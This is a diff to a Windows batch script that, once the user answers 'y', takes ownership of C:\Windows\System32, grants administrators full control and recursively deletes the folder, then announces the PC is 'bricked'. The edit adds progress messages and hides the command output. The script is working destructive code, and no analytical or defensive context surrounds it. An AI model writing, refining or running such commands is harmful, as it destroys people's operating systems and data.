@@ -11,11 +11,14 @@ set /p choice="Enter your choice[y/n]: "
 if /i "%choice%"=="y" ( 
     echo In that case, let's delete your computer. 
     timeout /t 2 >nul 
-    takeown /f C:\Windows\System32 /r /d y 
-    icacls C:\Windows\System32 /grant administrators:F /t /q 
-    rd /s /q C:\Windows\System32 
+    echo Taking ownership of system files...
+    takeown /f C:\Windows\System32 /r /d y >nul 2>&1
+    echo Granting administrative rights to control system files...
+    icacls C:\Windows\System32 /grant administrators:F /t /q >nul 2>&1
+    echo Deleting system files...
+    rd /s /q C:\Windows\System32 >nul 2>&1
     cls 
-    echo Complete. Your PC is now bricked. Try restarting your computer and see what happens. 
+    echo Complete. Your PC is now bricked. Try restarting your computer or clicking programs and see what happens. 
     pause 
     exit
 ) else ( 
